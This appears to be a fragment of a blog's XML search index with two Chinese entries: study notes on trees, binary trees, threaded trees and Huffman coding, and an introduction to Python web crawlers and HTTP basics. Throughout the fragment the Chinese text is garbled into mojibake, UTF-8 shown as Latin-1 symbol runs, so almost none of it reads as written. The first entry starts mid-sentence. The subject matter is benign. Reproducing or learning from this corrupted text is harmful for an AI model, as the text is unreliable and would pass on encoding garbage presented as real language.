‘ä¸­å„ä¸ªèŠ‚ç‚¹çš„åº¦çš„æœ€å¤§å€¼ç§°ä¸ºè¯¥æ ‘çš„åº¦ã€‚ èŠ‚ç‚¹(åŒäº²èŠ‚ç‚¹)çš„å­æ ‘çš„æ ¹èŠ‚ç‚¹ï¼Œç§°ä¸ºè¯¥èŠ‚ç‚¹çš„å­©å­èŠ‚ç‚¹ã€‚åŒä¸€ä¸ªåŒäº²èŠ‚ç‚¹çš„å­©å­èŠ‚ç‚¹ä¹‹é—´äº’ç§°å…„å¼Ÿ(Sibling),åŒäº²èŠ‚ç‚¹ä¸ç›¸åŒä½†å¤„äºŽåŒä¸€å±‚çš„äº’ç§°å ‚å…„å¼Ÿã€‚ åœ¨ä¸€æ£µæ ‘ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰è‡ªå·±çš„å±‚æ¬¡(åº¦è¡¨ç¤ºçš„æ˜¯å¦ä¸€ä¸ªç»´åº¦)ï¼Œå±‚æ¬¡çš„é¡ºåºä¸ºï¼šæ ¹èŠ‚ç‚¹ä½äºŽ1å±‚ï¼Œæ ‘ä¸­èŠ‚ç‚¹çš„å±‚æ¬¡çš„æœ€å¤§å€¼ç§°ä¸ºæ ‘çš„æ·±åº¦(Depth)æˆ–é«˜åº¦ã€‚ åœ¨ä¸€æ£µæ ‘ä¸­ï¼ŒåŒå±‚çš„å­©å­èŠ‚ç‚¹å·¦å³äº’æ¢ä¼šå‘ç”Ÿå˜åŒ–ï¼Œåˆ™è¯¥æ ‘ç§°ä¸ºæœ‰åºæ ‘ï¼Œåä¹‹ç§°ä¸ºæ— åºæ ‘ã€‚ æ ‘çš„å‡ ä¸ªåŸºæœ¬ç‰¹å¾ï¼šä¸€æ£µç”±nä¸ªèŠ‚ç‚¹ç»„æˆçš„æ ‘ï¼Œå…¶è¾¹çš„æ•°ç›®ä¸ºn-1ã€‚å¦‚æžœä¸€ä¸ªå®žé™…é—®é¢˜åœ¨å»ºæ¨¡æ—¶æ— æ³•ç”¨ä¸€æ£µæ ‘è¡¨è¾¾ï¼Œè€Œå¿…é¡»é‡‡ç”¨å¤šæ£µäº’ä¸ç›¸äº¤çš„æ ‘æ¥è¡¨ç¤ºï¼Œé‚£ä¹ˆè¿™äº›å¤šæ£µäº’ä¸ç›¸äº¤çš„æ ‘ç§°ä¸ºæ£®æž—ã€‚ æ ‘çš„å­˜å‚¨ç»“æž„è¡¨ç¤ºï¼šåŒäº²è¡¨ç¤ºæ³•ï¼Œå­©å­è¡¨ç¤ºæ³•ï¼Œå­©å­å…„å¼Ÿè¡¨ç¤ºæ³•ã€‚(æ ‘çš„å­˜å‚¨ï¼Œå…³é”®åœ¨äºŽå­˜å‚¨æ•°æ®å…ƒç´ ä¸Žæ•°æ®å…ƒç´ ä¹‹é—´çš„å…³ç³»)ã€‚ åŒäº²è¡¨ç¤ºæ³•ï¼šå‡è®¾ä»¥ä¸€ç»„è¿žç»­çš„ç©ºé—´æ¥å­˜å‚¨æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹çš„å€¼ï¼ŒåŒæ—¶åœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸­è®¾ç½®ä¸€ä¸ªåŸŸæŒ‡ç¤ºåŒäº²èŠ‚ç‚¹åœ¨æœ¬è¿žç»­ç©ºé—´ä¸­çš„ä¸‹æ ‡ä½ç½®ã€‚è¿™ç§å­˜å‚¨ç»“æž„åˆ©ç”¨äº†æ ‘ç»“æž„ä¸­æ¯ä¸ªèŠ‚ç‚¹(é™¤æ ¹èŠ‚ç‚¹å¤–)éƒ½åªæœ‰å”¯ä¸€çš„åŒäº²çš„æ€§è´¨ï¼Œç”¨ä¸€ç»´æ•°ç»„æ¥å­˜æ”¾æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹ï¼Œå¹¶è®¾ç½®parentåŸŸï¼Œå»ºç«‹èŠ‚ç‚¹ä¸ŽåŒäº²çš„ä¸€ä¸€æ˜ å°„ã€‚å…·ä½“å®žæ–½æ—¶ï¼Œæ³¨æ„æ˜¯æ•°ç»„çš„ä¸‹æ ‡åˆ†åˆ«ç»™èŠ‚ç‚¹ç¼–å·ï¼ŒèŠ‚ç‚¹å¹¶ä¸ä¸€å®šæ˜¯ä»Žæ ¹èŠ‚ç‚¹å¼€å§‹ç¼–çš„ï¼Œå¯èƒ½æ˜¯éšæœºçš„ã€‚parentåŸŸå³å­˜æ”¾åŒäº²èŠ‚ç‚¹çš„æ•°ç»„ä¸‹æ ‡ï¼Œæ ¹èŠ‚ç‚¹çš„parentåŸŸå­˜æ”¾-1.è¿™ç§æ–¹æ³•æ— æ³•å­˜æ”¾æœ‰åºæ ‘ï¼Œå¹¶ä¸”å—æ•°ç»„é•¿åº¦çš„é™åˆ¶ã€‚ å­©å­è¡¨ç¤ºæ³•ï¼šæŠŠæ¯ä¸ªèŠ‚ç‚¹çš„å­©å­èŠ‚ç‚¹æŽ’åˆ—èµ·æ¥ï¼Œçœ‹æˆä¸€ä¸ªçº¿æ€§è¡¨ï¼Œå¹¶ä¸”ä»¥å•é“¾è¡¨å­˜å‚¨ï¼Œåˆ™nä¸ªèŠ‚ç‚¹å…·æœ‰nä¸ªå­©å­é“¾è¡¨(å¶å­èŠ‚ç‚¹çš„å­©å­é“¾è¡¨ä¸ºç©ºè¡¨)ï¼Œè€Œnä¸ªå¤´æŒ‡é’ˆåˆç»„æˆä¸€ä¸ªçº¿æ€§è¡¨ã€‚é€šä¿—åœ°æ¥è¯´ï¼Œå°±æ˜¯å…ˆç”¨ä¸€ç»´æ•°ç»„æŠŠæ‰€æœ‰èŠ‚ç‚¹è¿›è¡Œä¸€æ¬¡ç¼–å·ï¼ŒchildåŸŸæŒ‡å‘å…¶ä¸­ä¸€ä¸ªå­©å­èŠ‚ç‚¹çš„æ•°ç»„ä¸‹æ ‡ç¼–å·ï¼Œè¯¥å­©å­èŠ‚ç‚¹çš„childåŸŸå†æŒ‡å‘ä¸‹ä¸€ä¸ªå­©å­èŠ‚ç‚¹çš„æ•°ç»„ä¸‹æ ‡ç¼–å·(åŒå±‚æ¬¡)ã€‚å¯ä»¥è¡¨ç¤ºæœ‰åºæ ‘ï¼Œä½†éš¾ä»¥ç¡®å®šä¸€ä¸ªèŠ‚ç‚¹çš„å±‚æ¬¡ï¼Œæ ‘èŠ‚ç‚¹ä¸ªæ•°åŒæ ·å—æ•°ç»„é•¿åº¦çš„é™åˆ¶ã€‚ äºŒï¼šäºŒå‰æ ‘ äºŒå‰æ ‘(Binary Tree)ï¼Œå…¶ç‰¹ç‚¹æ˜¯æ¯ä¸ªèŠ‚ç‚¹æœ€å¤šæœ‰ä¸¤æ£µå­æ ‘ï¼Œå¹¶ä¸”æœ‰å·¦å³ä¹‹åˆ†(æœ‰åºæ ‘)ã€‚ åœ¨äºŒå‰æ ‘çš„ç¬¬Kå±‚ä¸Šï¼Œè‡³å¤šæœ‰2^(k-1)ä¸ªèŠ‚ç‚¹ã€‚æ·±åº¦ä¸ºKçš„äºŒå‰æ ‘è‡³å¤šæœ‰2^k-1ä¸ªèŠ‚ç‚¹ã€‚ å¯¹äºŽä»»æ„ä¸€æ£µäºŒå‰æ ‘ï¼Œå¦‚æžœå…¶ç»ˆç«¯èŠ‚ç‚¹æ•°ä¸ºn0ï¼Œåº¦ä¸º2çš„èŠ‚ç‚¹æ•°ä¸ºn2ï¼Œåˆ™æœ‰n0=n2+1. å…ˆåºéåŽ†ï¼Œä¸­åºéåŽ†ï¼ŒåŽåºéåŽ†å…³é”®åœ¨äºŽæ ¹èŠ‚ç‚¹çš„è®¿é—®é¡ºåºä¸åŒï¼ŒéåŽ†çš„æ—¶å€™è¦å‡è®¾ä¸¤æ£µå­æ ‘éƒ½å­˜åœ¨ï¼Œè¦éåŽ†åˆ™ä»Žæœ€ä½Žç«¯çš„å¶å­å¼€å§‹ã€‚ æ»¡äºŒå‰æ ‘ï¼šæ¯ä¸€å±‚çš„èŠ‚ç‚¹ä¸ªæ•°è¾¾åˆ°æœ€å¤§ã€‚ å®Œå…¨äºŒå‰æ ‘ï¼šé™¤äº†æœ€ä¸‹é¢ä¸€å±‚å¶å­èŠ‚ç‚¹ä¹‹å¤–ï¼Œå…¶ä»–å„å±‚èŠ‚ç‚¹æ•°è¾¾åˆ°æœ€å¤§å€¼ã€‚å¹¶ä¸”æœ€åŽä¸€å±‚å¶å­èŠ‚ç‚¹æŒ‰ç…§ä»Žå·¦åˆ°å³çš„é¡ºåºè¿žç»­å­˜åœ¨ï¼Œåªç¼ºæœ€åŽä¸€å±‚è‹¥å¹²èŠ‚ç‚¹ã€‚ ä¸‰ï¼šçº¿ç´¢äºŒå‰æ ‘ä¸€èˆ¬çš„äºŒå‰é“¾è¡¨åªèƒ½æ‰¾åˆ°å·¦å³å­©å­ï¼Œæ‰¾ä¸åˆ°å‰é©±ï¼ŒåŽç»§èŠ‚ç‚¹ã€‚å……åˆ†åˆ©ç”¨äºŒå‰é“¾è¡¨çš„ç©ºæŒ‡é’ˆï¼Œä½¿å¾—åœ¨éåŽ†è¿‡ç¨‹ä¸­èƒ½æ‰¾åˆ°å„ä¸ªèŠ‚ç‚¹çš„å…ˆé©±åŽç»§ã€‚çº¿ç´¢åŒ–å°±æ˜¯åœ¨éåŽ†ä¸­å®Œæˆå¯¹å¶å­èŠ‚ç‚¹çš„æŒ‡é’ˆæ·»åŠ çš„è¿‡ç¨‹ã€‚æŒ‡å‘èŠ‚ç‚¹å‰é©±å’ŒåŽç»§çš„æŒ‡é’ˆå«åšçº¿ç´¢ï¼Œçº¿ç´¢äºŒå‰æ ‘æŸä¸ªèŠ‚ç‚¹ä¸­çš„åŸŸåˆ†åˆ«ä¸ºLchild,LTag,data,RTag,Rchild.Tagä¸º0è¡¨ç¤ºLchild/RchildæŒ‡å­©å­ï¼Œåä¹‹æŒ‡å‰é©±åŽç»§èŠ‚ç‚¹ã€‚ çº¿ç´¢æ ‘çš„ç”»æ³•ï¼šç»™å‡ºå‰åºéåŽ†åºåˆ—å’Œä¸­åºéåŽ†åºåˆ—ï¼Œè¦æ±‚ç”»åŽåºçº¿ç´¢æ ‘ã€‚é¦–å…ˆæŠŠåŽåºéåŽ†åºåˆ—å†™å‡ºï¼Œä¹‹åŽæŸ¥çœ‹æ¯ä¸ªèŠ‚ç‚¹çš„å·¦å³ä¸¤è¾¹æ˜¯å¦æœ‰èŠ‚ç‚¹ã€‚å¦‚æžœå·¦è¾¹æ²¡æœ‰èŠ‚ç‚¹ï¼Œåˆ™ç”¨è™šçº¿æŒ‡å‘ï¼ŒåŽåºéåŽ†åºåˆ—ä¸­è¯¥èŠ‚ç‚¹çš„å·¦è¾¹ä¸€ä¸ªå…ƒç´ ã€‚å¦‚æžœå³è¾¹æ²¡æœ‰èŠ‚ç‚¹ï¼Œåˆ™ç”¨è™šçº¿æŒ‡å‘ï¼ŒåŽåºéåŽ†åºåˆ—ä¸­ï¼Œè¯¥èŠ‚ç‚¹å³è¾¹çš„ä¸€ä¸ªå…ƒç´ ã€‚ å››ï¼šå“ˆå¤«æ›¼æ ‘(Huffman) è·¯å¾„é•¿åº¦ï¼šä»Žæ ‘ä¸­ä¸€ä¸ªèŠ‚ç‚¹åˆ°å¦ä¸€ä¸ªèŠ‚ç‚¹ä¹‹é—´çš„åˆ†æ”¯æž„æˆçš„è·¯å¾„ï¼Œåˆ†æ”¯æ•°ç›®ç§°ä¸ºè·¯å¾„é•¿åº¦ã€‚ æ ‘çš„è·¯å¾„é•¿åº¦ï¼šä»Žæ ‘æ ¹åˆ°æ¯ä¸€ä¸ªèŠ‚ç‚¹çš„è·¯å¾„é•¿åº¦ä¹‹å’Œã€‚ æ ‘çš„å¸¦æƒè·¯å¾„é•¿åº¦ï¼šæ ‘ä¸­æ‰€æœ‰å¶å­èŠ‚ç‚¹çš„å¸¦æƒè·¯å¾„é•¿åº¦å’Œã€‚WPL=WkLkä»Žk=1åˆ°k=nçš„æ±‚å’Œã€‚å¯¹äºŽèŠ‚ç‚¹ä¸ªæ•°ç›¸åŒçš„æ ‘ï¼Œå®Œå…¨äºŒå‰æ ‘æ˜¯è·¯å¾„é•¿åº¦æœ€çŸ­çš„æ ‘ã€‚ æœ€ä¼˜äºŒå‰æ ‘(å“ˆå¤«æ›¼æ ‘)ï¼šæœ‰nä¸ªæƒå€¼{W1,W2,â€¦â€¦ï¼ŒWn}æž„é€ ä¸€æ£µæœ‰nä¸ªå¶å­èŠ‚ç‚¹çš„äºŒå‰æ ‘ï¼Œæ¯ä¸ªå¶å­èŠ‚ç‚¹å¸¦ä¸€ä¸ªæƒå€¼ï¼Œåˆ™å…¶ä¸­å¸¦æƒè·¯å¾„é•¿åº¦WPLæœ€å°çš„äºŒå‰æ ‘ç§°ä¸ºæœ€ä¼˜äºŒå‰æ ‘ã€‚WPLçš„è®¡ç®—ï¼Œé€šä¿—åœ°æ¥è¯´å°±æ˜¯æƒå€¼ä¹˜ä»¥ï¼ˆè·¯å¾„ä¸ŠèŠ‚ç‚¹çš„ä¸ªæ•°-1ï¼‰ã€‚æž„é€ æ­¥éª¤ï¼Œç»™å‡ºäº†ä¸€ç»„æƒå€¼ï¼Œé€‰æ‹©ä¸¤ä¸ªæœ€å°çš„æƒå€¼ä½œä¸ºå­æ ‘ï¼Œæ ¹èŠ‚ç‚¹çš„æƒå€¼ä¸ºä¸¤å­æ ‘æƒå€¼ä¹‹å’Œã€‚æ³¨æ„å½“æ ¹èŠ‚ç‚¹çš„æƒå€¼å°äºŽä¸¤æœ€å°æƒå€¼ä¹‹å’Œæ—¶ï¼Œéœ€è¦å†å»ºç«‹ä¸€æ£µå­æ ‘ã€‚è¿™æ—¶é€‰å‡ºçš„ä¸¤ä¸ªæ•°å­—éƒ½ä¸æ˜¯å·²ç»æž„é€ å¥½çš„äºŒå‰æ ‘é‡Œé¢çš„èŠ‚ç‚¹ï¼Œæ‰€ä»¥è¦å¦å¤–å¼€ä¸€æ£µäºŒå‰æ ‘ã€‚å¦‚æžœä¸¤ä¸ªæ•°çš„å’Œæ­£å¥½æ˜¯ä¸‹ä¸€æ­¥çš„ä¸¤ä¸ªæœ€å°æ•°çš„å…¶ä¸­çš„ä¸€ä¸ªï¼Œé‚£ä¹ˆè¿™ä¸ªæ ‘ç›´æŽ¥å¾€ä¸Šç”Ÿé•¿å°±å¯ä»¥äº†ï¼Œå¦‚æžœè¿™ä¸¤ä¸ªæ•°çš„å’Œæ¯”è¾ƒå¤§ï¼Œä¸æ˜¯ä¸‹ä¸€æ­¥çš„ä¸¤ä¸ªæœ€å°æ•°çš„å…¶ä¸­ä¸€ä¸ªï¼Œé‚£ä¹ˆå°±å¹¶åˆ—ç”Ÿé•¿ã€‚(æž„é€ å“ˆå¤«æ›¼æ ‘å¸¸è§è¯¯åŒº) å“ˆå¤«æ›¼ç¼–ç ï¼šåˆ©ç”¨å“ˆå¤«æ›¼æ ‘æ±‚å¾—çš„ç”¨äºŽé€šä¿¡çš„äºŒè¿›åˆ¶ç¼–ç ç§°ä¸ºå“ˆå¤«æ›¼ç¼–ç ã€‚æ ‘ä¸­ä»Žæ ¹åˆ°æ¯ä¸ªå¶å­èŠ‚ç‚¹éƒ½æœ‰ä¸€æ¡è·¯å¾„ï¼Œå¯¹è·¯å¾„ä¸Šçš„å„åˆ†æ”¯çº¦å®šæŒ‡å‘å·¦å­æ ‘çš„åˆ†æ”¯è¡¨ç¤ºâ€0â€ç ï¼ŒæŒ‡å‘å³å­æ ‘çš„åˆ†æ”¯è¡¨ç¤ºâ€1â€ç ï¼Œå–æ¯æ¡è·¯å¾„ä¸Šçš„â€0â€æˆ–â€1â€çš„åºåˆ—ä½œä¸ºå„ä¸ªå¶å­èŠ‚ç‚¹å¯¹åº”çš„å­—ç¬¦ç¼–ç ï¼Œå³æ˜¯å“ˆå¤«æ›¼ç¼–ç ã€‚]]></content>
  </entry>
  <entry>
    <title><![CDATA[Pythonçˆ¬è™«]]></title>
    <url>%2F2019%2F09%2F20%2FPython%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[åœ¨å¤§å­¦è®¡ç®—æœºä¸“ä¸šã€ç†å·¥ç±»ä¸“ä¸šå¤§å¤šå­¦ä¹ ï¼ŒC/C++ï¼ŒJavaè¿™äº›å¼€å‘è¯­è¨€ï¼ŒAndroid, iOSä¹Ÿæœ‰ä¸å°‘åŒå­¦ä¹°ä¹¦æˆ–ä¸‹è½½è§†é¢‘å­¦ä¹ ï¼Œä½†æ˜¯æœ€åŽéƒ½æ˜¯æ²¡æœ‰ç»“æžœã€‚ æŠŠç¼–ç¨‹å¼€å‘å­¦ä¹ å½“ä½œä¸€ä¸ªæŠ€èƒ½æ¥å­¦ä¹ ï¼Œè€Œä¸æ˜¯å¤§å­¦ä¸­çš„å­¦ä¹ ã€‚ä¸­å­¦ã€å¤§å­¦çš„å­¦ä¹ ç›®æ ‡æ˜¯ä¸ºäº†è€ƒè¯•ï¼Œå®Œæˆå­¦åˆ†ã€‚äº†è§£ä¹ å¾—æ€§çš„æŠ€èƒ½å­¦ä¹ çš„è§„å¾‹ã€‚å³å¼ºåŒ–è®­ç»ƒï¼Œåå¤è®­ç»ƒã€‚æ²¡æœ‰ä¸€å®šå¼ºåº¦çš„åå¤æ“ç»ƒæ˜¯ä¸å¯èƒ½æŽŒæ¡ä¸€é—¨æŠ€èƒ½ã€‚ å®Œæˆä»£ç é‡çš„è®­ç»ƒï¼Œå¦‚æžœè¦å®šä¸€ä¸ªé‡çš„è¯æ˜¯10000è¡Œã€‚ ä½ å¯ä»¥æƒ³ä¸€æƒ³å¤§å­¦é‡Œå­¦C, C++, C#å†™äº†å¤šå°‘ä»£ç ï¼Ÿå¾ˆå¤šåŒå­¦æ˜¯ä¸è¶…è¿‡200è¡Œã€‚ ä¸€å®šè¦åšé¡¹ç›®ã€‚æ¯å¤©å®Œæˆä¸€äº›ç»ƒä¹ ã€Demoï¼Œè¿˜ä¸å¤Ÿã€‚æŠŠè¿™ä¸ªé¡¹ç›®å½“ä½œä½ ç‹¬ç«‹çš„ä½œå“æ¥å®Œæˆã€‚ æ¯å¤©å†™æ—¥å¿—ã€å†™æ€»ç»“ã€‚ç”¨markdownã€åšå®¢æ¥å†™ï¼Œè®°å½•ä½ å­¦ä¹ è¿‡ç¨‹ä¸­çš„é—®é¢˜ã€æ€è·¯å’Œæˆå°±ã€‚ åŸºç¡€çŸ¥è¯†ï¼šç½‘ç»œçˆ¬è™«ï¼Œæ˜¯ä¸€ç§æŒ‰ç…§ä¸€å®šçš„è§„åˆ™ï¼Œè‡ªåŠ¨çš„æŠ“å–ä¸‡ç»´ç½‘ä¿¡æ¯çš„ç¨‹åºæˆ–è€…è„šæœ¬ã€‚ æœç´¢å¼•æ“Žå·¥ä½œåŽŸç† ç¬¬ä¸€æ­¥ï¼šæŠ“å–ç½‘é¡µ(spider) æœç´¢å¼•æ“Žé€šè¿‡ç‰¹å®šè§„å¾‹æŠ“å–ç½‘é¡µï¼Œè¿™ç§ç‰¹æ®Šè§„å¾‹ä½“çŽ°åœ¨Robotsåè®®(ç½‘ç»œçˆ¬è™«æŽ’é™¤æ ‡å‡†)ä¸­ï¼Œç½‘ç«™é€šè¿‡Robotåè®®å‘Šè¯‰æœç´¢å¼•æ“Žå“ªäº›é¡µé¢å¯ä»¥è¢«æŠ“å–ï¼Œå“ªäº›ä¸èƒ½ã€‚æŸ¥çœ‹Robotsåè®®çš„æ–¹æ³•æ˜¯åœ¨ç½‘å€åŽåŠ ä¸Šâ€/robots.txtâ€ ç¬¬äºŒæ­¥ï¼šæ•°æ®å­˜å‚¨ æœç´¢å¼•æ“Žé€šè¿‡spiderè·Ÿè¸ªé“¾æŽ¥çˆ¬è¡Œåˆ°ç½‘é¡µï¼Œå¹¶å°†çˆ¬è¡Œçš„æ•°æ®å­˜å…¥åŽŸå§‹é¡µé¢æ•°æ®åº“ã€‚ ç¬¬ä¸‰æ­¥ï¼šé¢„å¤„ç† æœç´¢å¼•æ“Žå°†èœ˜è››æŠ“å–å›žæ¥çš„é¡µé¢ï¼Œè¿›è¡Œå„ç§æ­¥éª¤çš„é¢„å¤„ç†ã€‚å¦‚â’ˆæå–æ–‡å­— â’‰ä¸­æ–‡åˆ†è¯ â’ŠåŽ»åœæ­¢è¯ â’‹æ¶ˆé™¤å™ªéŸ³ï¼ˆæœç´¢å¼•æ“Žéœ€è¦è¯†åˆ«å¹¶æ¶ˆé™¤è¿™äº›å™ªå£°ï¼Œæ¯”å¦‚ç‰ˆæƒå£°æ˜Žæ–‡å­—ã€å¯¼èˆªæ¡ã€å¹¿å‘Šç­‰â€¦â€¦ï¼‰ 5.æ­£å‘ç´¢å¼• 6.å€’æŽ’ç´¢å¼• 7.é“¾æŽ¥å…³ç³»è®¡ç®— 8.ç‰¹æ®Šæ–‡ä»¶å¤„ç†ã€‚é™¤äº†HTMLæ–‡ä»¶å¤–ï¼Œæœç´¢å¼•æ“Žé€šå¸¸è¿˜èƒ½æŠ“å–å’Œç´¢å¼•ä»¥æ–‡å­—ä¸ºåŸºç¡€çš„å¤šç§æ–‡ä»¶ç±»åž‹ï¼Œå¦‚ PDFã€Wordã€WPSã€XLSã€PPTã€TXT æ–‡ä»¶ç­‰ã€‚ ç¬¬å››æ­¥ï¼šæŽ’åï¼Œæä¾›æ£€ç´¢æœåŠ¡ èšç„¦çˆ¬è™«ä¸Žé€šç”¨çˆ¬è™« èšç„¦çˆ¬è™«æ˜¯ä¸€ä¸ªè‡ªåŠ¨ä¸‹è½½ç½‘é¡µçš„ç¨‹åºï¼Œå®ƒæ ¹æ®æ—¢å®šçš„æŠ“å–ç›®æ ‡ï¼Œæœ‰é€‰æ‹©çš„è®¿é—®ä¸‡ç»´ç½‘ä¸Šçš„ç½‘é¡µä¸Žç›¸å…³çš„é“¾æŽ¥ï¼ŒèŽ·å–æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚ä¸Žé€šç”¨çˆ¬è™«(general purpose web crawler)ä¸åŒï¼Œèšç„¦çˆ¬è™«å¹¶ä¸è¿½æ±‚å¤§çš„è¦†ç›–ï¼Œè€Œå°†ç›®æ ‡å®šä¸ºæŠ“å–ä¸ŽæŸä¸€ç‰¹å®šä¸»é¢˜å†…å®¹ç›¸å…³çš„ç½‘é¡µï¼Œä¸ºé¢å‘ä¸»é¢˜çš„ç”¨æˆ·æŸ¥è¯¢å‡†å¤‡æ•°æ®èµ„æºã€‚ åŸºæœ¬åŽŸç†çˆ¬è™«æ˜¯ æ¨¡æ‹Ÿç”¨æˆ·åœ¨æµè§ˆå™¨æˆ–è€…æŸä¸ªåº”ç”¨ä¸Šçš„æ“ä½œï¼ŒæŠŠæ“ä½œçš„è¿‡ç¨‹ã€å®žçŽ°è‡ªåŠ¨åŒ–çš„ç¨‹åºã€‚ è¾“å…¥urlå¯¹æœåŠ¡å™¨å‘èµ·è¯·æ±‚åŽï¼Œç®€å•æ¥è¯´å°†ç»åŽ†å››ä¸ªæ­¥éª¤ï¼š æŸ¥æ‰¾åŸŸåå¯¹åº”çš„IPåœ°å€ å‘IPå¯¹åº”çš„æœåŠ¡å™¨å‘å‡ºè¯·æ±‚ æœåŠ¡å™¨å“åº”è¯·æ±‚ï¼Œå‘å›žç½‘é¡µå†…å®¹ æµè§ˆå™¨è§£æžç½‘é¡µå†…å®¹ ç½‘ç»œçˆ¬è™«æœ¬è´¨ä¸Šå°±æ˜¯æµè§ˆå™¨çš„httpè¯·æ±‚ï¼Œæµè§ˆå™¨ä¸Žçˆ¬è™«éƒ½é€šè¿‡ç›¸åŒçš„æ–¹å¼æ¥èŽ·å–ç½‘é¡µï¼Œä½†æ˜¯ç½‘ç»œçˆ¬è™«æ‰€åšçš„ç›¸å½“äºŽå°†æµè§ˆå™¨çš„åŠŸèƒ½æ‰¹é‡æ‰§è¡Œï¼Œé€šè¿‡æŒ‡å®šurlç›´æŽ¥è¿”å›žç¬¦åˆæŸ¥æ‰¾è§„å¾‹çš„æ•°æ®ï¼Œè€Œä¸ç”¨ç”¨æˆ·äººå·¥èŽ·å–ã€‚ HTTPåè®®ï¼šå³è¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼Œæ˜¯ä¸€ç§å‘å¸ƒå’ŒæŽ¥å—è¶…æ–‡æœ¬é“¾æŽ¥HTMLçš„æ–¹æ³•ã€‚ HTTPåè®®åŸºäºŽTCPåè®®ï¼ŒTCP/IPåè®®å‚è€ƒæ¨¡åž‹å¦‚ä¸Šã€‚httpä¸ºåº”ç”¨å±‚çš„åè®®ï¼Œé»˜è®¤å…¶ç«¯å£å·ä¸º80ï¼Œhttpsçš„ç«¯å£å·æ˜¯443. httpæ“ä½œçš„å…·ä½“è¿‡ç¨‹ï¼š åœ°å€è§£æžï¼šä»Žurlä¸­åˆ†ç¦»å‡ºåè®®åï¼Œä¸»æœºåï¼Œç«¯å£ï¼Œå¯¹è±¡è·¯å¾„ç­‰éƒ¨åˆ†,åŸŸåç³»ç»ŸDNSè§£æžåŸŸåä¹Ÿæ˜¯åœ¨è¿™ä¸€æ­¥ã€‚ å°è£…HTTPè¯·æ±‚åŒ…ï¼šå°†ä»¥ä¸Šéƒ¨åˆ†ç»“åˆæœ¬æœºä¿¡æ¯(IPç­‰)ï¼Œå°è£…æˆä¸€ä¸ªHTTPè¯·æ±‚åŒ…ï¼Œ å°è£…æˆTCPåŒ…ï¼Œå»ºç«‹TCPè¿žæŽ¥ï¼ˆä¸‰æ¬¡æ¡æ‰‹ï¼‰ï¼šHTTPåè®®æ˜¯æ¯”TCPæ›´é«˜çº§çš„åº”ç”¨å±‚åè®®ï¼Œæ ¹æ®è§„åˆ™ï¼Œåªæœ‰ä½Žå±‚åè®®å»ºç«‹ä¹‹åŽï¼Œæ‰èƒ½è¿›è¡Œæ›´é«˜å±‚åè®®çš„è¿žæŽ¥ï¼Œæ‰€ä»¥åœ¨HTTPå¼€å§‹å·¥ä½œä¹‹å‰ï¼Œå®¢æˆ·æœºçš„webæµè§ˆå™¨é¦–å…ˆé€šè¿‡ç½‘ç»œä¸ŽæœåŠ¡å™¨é€šè¿‡TCPåè®®å»ºç«‹è¿žæŽ¥ã€‚ä¸€èˆ¬TCPè¿žæŽ¥çš„ç«¯å£å·æ˜¯80ï¼Œä½†åœ¨è¿™æ˜¯8080. å®¢æˆ·æœºå‘é€è¯·æ±‚å‘½ä»¤ï¼šå»ºç«‹è¿žæŽ¥åŽï¼Œå®¢æˆ·æœºå‘é€httpè¯·æ±‚è¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œ(å…·ä½“æ“ä½œï¼Œè¯·æ±‚çš„æ ¼å¼ï¼ŒçŠ¶æ€ç ï¼Œget/poståœ¨æ­¤å¤„ä¸æ·±ç©¶ã€‚) æœåŠ¡å™¨ç›¸åº”ï¼šæœåŠ¡å™¨æŽ¥åˆ°è¯·æ±‚åŽï¼Œç»™äºˆç›¸åº”çš„httpç›¸åº”ã€‚ æœåŠ¡å™¨å…³é—­TCPè¿žæŽ¥ï¼šä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€æ—¦WebæœåŠ¡å™¨å‘æµè§ˆå™¨å‘é€äº†è¯·æ±‚æ•°æ®ï¼Œå®ƒå°±è¦å…³é—­TCPè¿žæŽ¥ã€‚ HTTPSï¼ˆå…¨ç§°ï¼šHypertext Transfer Protocol over Secure Socket Layerï¼‰ï¼Œæ˜¯ä»¥å®‰å…¨ä¸ºç›®æ ‡çš„HTTPé€šé“ï¼Œç®€å•è®²æ˜¯HTTPçš„å®‰å…¨ç‰ˆã€‚å³HTTPä¸‹åŠ å…¥SSLå±‚ï¼ŒHTTPSçš„å®‰å…¨åŸºç¡€æ˜¯SSLã€‚å…¶æ‰€ç”¨çš„ç«¯å£å·æ˜¯443ã€‚ Httpåè®®å®šä¹‰äº†å¾ˆå¤šä¸ŽæœåŠ¡å™¨äº¤äº’çš„æ–¹æ³•ï¼Œæœ€åŸºæœ¬çš„æœ‰4ç§ï¼Œåˆ†åˆ«æ˜¯GET,POST,PUT,DELETE. ä¸€ä¸ªURLåœ°å€ç”¨äºŽæè¿°ä¸€ä¸ªç½‘ç»œä¸Šçš„èµ„æºï¼Œè€ŒHTTPä¸­çš„GET, POST, PUT, DELETEå°±å¯¹åº”ç€å¯¹è¿™ä¸ªèµ„æºçš„æŸ¥ï¼Œæ”¹ï¼Œå¢žï¼Œåˆ 4ä¸ªæ“ä½œã€‚ æˆ‘ä»¬æœ€å¸¸è§çš„å°±æ˜¯GETå’ŒPOSTäº†ã€‚GETä¸€èˆ¬ç”¨äºŽèŽ·å–/æŸ¥è¯¢èµ„æºä¿¡æ¯ï¼Œè€ŒPOSTä¸€èˆ¬ç”¨äºŽæ›´æ–°èµ„æºä¿¡æ¯. GETæäº¤çš„æ•°æ®ä¼šæ”¾åœ¨URLä¹‹åŽï¼Œä»¥?åˆ†å‰²URLå’Œä¼ è¾“æ•°æ®ï¼Œå‚æ•°ä¹‹é—´ä»¥&amp;ç›¸è¿žï¼Œå¦‚EditPosts.aspx?name=test1&amp;id=123456. POSTæ–¹æ³•æ˜¯æŠŠæäº¤çš„æ•°æ®æ”¾åœ¨HTTPåŒ…çš„Bodyä¸­. GETæäº¤çš„æ•°æ®å¤§å°æœ‰é™åˆ¶ï¼ˆå› ä¸ºæµè§ˆå™¨å¯¹URLçš„é•¿åº¦æœ‰é™åˆ¶ï¼‰ï¼Œè€ŒPOSTæ–¹æ³•æäº¤çš„æ•°æ®æ²¡æœ‰é™åˆ¶. 